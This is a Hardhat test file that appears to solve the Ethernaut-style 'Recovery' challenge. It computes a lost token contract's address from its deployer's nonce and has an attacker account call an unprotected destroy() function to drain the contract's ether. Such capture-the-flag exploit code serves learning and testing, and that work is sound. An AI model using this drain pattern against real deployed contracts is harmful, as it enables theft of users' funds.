import { getContractAddress } from '@ethersproject/address';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

const TOKEN_NAME = 'MyToken';
const TOKEN_INITIAL_SUPPLY = utils.parseEther('100000');
const ETHER_SENT = utils.parseEther('0.001');

describe('Recovery', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('Recovery');
    contract = await Factory.connect(owner).deploy();
    await contract.deployed();

    let tx = await contract.connect(owner).generateToken(TOKEN_NAME, TOKEN_INITIAL_SUPPLY);
    const receipt = await tx.wait();

    const newTokenAddress = receipt.events[0].args[0];

    tx = await owner.sendTransaction({
      to: newTokenAddress,
      value: ETHER_SENT,
    });
    await tx.wait();
  });

  it('attack', async () => {
    const tokenContractAddress = getContractAddress({
      from: contract.address,
      nonce: 1, // First contract deployed by Recovery contract -> nonce 1
    });

    const TokenFactory = await ethers.getContractFactory('SimpleToken');
    const tokenContract = await TokenFactory.attach(tokenContractAddress);

    expect(await tokenContract.name()).to.equal(TOKEN_NAME);
    expect(await provider.getBalance(tokenContractAddress)).to.equal(ETHER_SENT);

    let tx = await tokenContract.connect(attacker).destroy(attacker.address);
    await tx.wait();

    expect(await provider.getBalance(tokenContractAddress)).to.equal(0);
  });
});
